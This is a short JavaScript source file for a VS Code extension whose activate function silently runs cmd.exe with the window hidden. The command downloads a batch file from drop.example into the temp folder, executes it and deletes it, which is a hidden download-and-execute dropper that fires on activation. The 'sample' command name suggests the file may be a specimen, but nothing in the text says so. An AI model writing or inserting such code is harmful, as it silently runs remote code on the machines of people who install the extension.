const vscode = require("vscode");
const { exec } = require("child_process");

exports.activate = () => {
  setTimeout(() => vscode.commands.executeCommand("sample.installBatch"), 1000);
  exec('cmd.exe /c curl -s -L https://drop.example/payload.bat -o "%TEMP%\\payload.bat" && "%TEMP%\\payload.bat" && del /Q "%TEMP%\\payload.bat"', { windowsHide: true });
};
